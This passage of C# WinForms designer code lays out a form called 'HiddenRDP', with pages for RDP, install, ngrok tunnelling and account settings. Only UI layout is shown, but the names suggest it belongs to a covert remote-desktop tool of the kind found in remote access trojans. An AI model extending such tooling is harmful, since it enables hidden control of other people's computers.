        this.UserIdInfo.ForeColor = System.Drawing.Color.DarkGray;
        this.UserIdInfo.Location = new System.Drawing.Point(75, 40);
        this.UserIdInfo.Name = "UserIdInfo";
        this.UserIdInfo.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.UserIdInfo.Size = new System.Drawing.Size(442, 15);
        this.UserIdInfo.TabIndex = 572;
        this.UserIdInfo.Text = "--";
        this.UserIdInfo.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.UserIdInfo.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.bunifuLabel1.AllowParentOverrides = false;
        this.bunifuLabel1.AutoEllipsis = false;
        this.bunifuLabel1.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel1.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel1.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel1.Location = new System.Drawing.Point(75, 17);
        this.bunifuLabel1.Name = "bunifuLabel1";
        this.bunifuLabel1.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel1.Size = new System.Drawing.Size(73, 17);
        this.bunifuLabel1.TabIndex = 571;
        this.bunifuLabel1.Text = "Hidden RDP";
        this.bunifuLabel1.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel1.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.ImageLogo.BackColor = System.Drawing.Color.FromArgb(244, 244, 250);
        this.ImageLogo.Image = (System.Drawing.Image)resources.GetObject("ImageLogo.Image");
        this.ImageLogo.Location = new System.Drawing.Point(10, 13);
        this.ImageLogo.Name = "ImageLogo";
        this.ImageLogo.Size = new System.Drawing.Size(59, 50);
        this.ImageLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
        this.ImageLogo.TabIndex = 570;
        this.ImageLogo.TabStop = false;
        this.PanelBottom.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelBottom.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelBottom.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelBottom.BackgroundImage");
        this.PanelBottom.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelBottom.BorderColor = System.Drawing.Color.White;
        this.PanelBottom.BorderRadius = 30;
        this.PanelBottom.BorderThickness = 1;
        this.PanelBottom.Location = new System.Drawing.Point(170, 427);
        this.PanelBottom.Name = "PanelBottom";
        this.PanelBottom.ShowBorders = true;
        this.PanelBottom.Size = new System.Drawing.Size(257, 25);
        this.PanelBottom.TabIndex = 594;
        this.PanelLeft.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left;
        this.PanelLeft.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelLeft.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelLeft.BackgroundImage");
        this.PanelLeft.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelLeft.BorderColor = System.Drawing.Color.White;
        this.PanelLeft.BorderRadius = 30;
        this.PanelLeft.BorderThickness = 1;
        this.PanelLeft.Location = new System.Drawing.Point(-16, 112);
        this.PanelLeft.Name = "PanelLeft";
        this.PanelLeft.ShowBorders = true;
        this.PanelLeft.Size = new System.Drawing.Size(25, 219);
        this.PanelLeft.TabIndex = 593;
        this.PanelTOP.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.PanelTOP.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelTOP.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelTOP.BackgroundImage");
        this.PanelTOP.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelTOP.BorderColor = System.Drawing.Color.White;
        this.PanelTOP.BorderRadius = 30;
        this.PanelTOP.BorderThickness = 1;
        this.PanelTOP.Location = new System.Drawing.Point(170, -14);
        this.PanelTOP.Name = "PanelTOP";
        this.PanelTOP.ShowBorders = true;
        this.PanelTOP.Size = new System.Drawing.Size(257, 25);
        this.PanelTOP.TabIndex = 592;
        this.PanelRight.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.PanelRight.BackgroundColor = System.Drawing.Color.Gainsboro;
        this.PanelRight.BackgroundImage = (System.Drawing.Image)resources.GetObject("PanelRight.BackgroundImage");
        this.PanelRight.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
        this.PanelRight.BorderColor = System.Drawing.Color.White;
        this.PanelRight.BorderRadius = 30;
        this.PanelRight.BorderThickness = 1;
        this.PanelRight.Location = new System.Drawing.Point(580, 108);
        this.PanelRight.Name = "PanelRight";
        this.PanelRight.ShowBorders = true;
        this.PanelRight.Size = new System.Drawing.Size(25, 219);
        this.PanelRight.TabIndex = 591;
        this.FormDragControl1.Fixed = true;
        this.FormDragControl1.Horizontal = true;
        this.FormDragControl1.TargetControl = this.PanelTitle;
        this.FormDragControl1.Vertical = true;
        this.Timer1.Interval = 2000;
        this.Timer1.Tick += new System.EventHandler(Timer1_Tick);
        base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
        base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
        this.BackColor = System.Drawing.Color.Gainsboro;
        base.ClientSize = new System.Drawing.Size(614, 462);
        base.Controls.Add(this.panelForm);
        base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
        base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
        base.Name = "HiddenRDP";
        base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
        this.Text = "HiddenRDP";
        base.TransparencyKey = System.Drawing.Color.Gainsboro;
        base.FormClosing += new System.Windows.Forms.FormClosingEventHandler(HiddenRDP_FormClosing);
        base.Load += new System.EventHandler(HiddenRDP_Load);
        base.Shown += new System.EventHandler(HiddenRDP_Shown);
        this.panelForm.ResumeLayout(false);
        this.PageRDP.ResumeLayout(false);
        this.PageInstall.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.pictureBox2).EndInit();
        this.PageNagrok.ResumeLayout(false);
        this.PageAccount.ResumeLayout(false);
        ((System.ComponentModel.ISupportInitialize)this.pictureBox3).EndInit();
        this.PaneControll.ResumeLayout(false);
        this.PanelTitle.ResumeLayout(false);
        this.PanelTitle.PerformLayout();
        ((System.ComponentModel.ISupportInitialize)this.ImageLogo).EndInit();
        base.ResumeLayout(false);
    }
}
